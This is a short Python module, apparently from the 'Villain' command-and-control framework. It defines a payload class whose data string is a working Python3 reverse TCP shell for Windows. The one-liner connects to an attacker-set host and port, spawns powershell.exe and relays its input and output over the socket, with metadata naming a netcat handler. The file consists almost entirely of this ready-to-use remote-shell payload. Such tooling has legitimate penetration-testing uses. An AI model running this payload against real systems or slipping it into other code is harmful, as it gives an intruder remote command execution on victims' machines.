# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Python3 Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Python3 Reverse TCP',
        'References' : ['https://github.com/swisskyrepo/PayloadsAllTheThings']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'python3-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = 'python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen([\'powershell.exe\'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\'*LHOST*\',*LPORT*));threading.Thread(target=exec,args=(\\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\",globals())).start()"'
    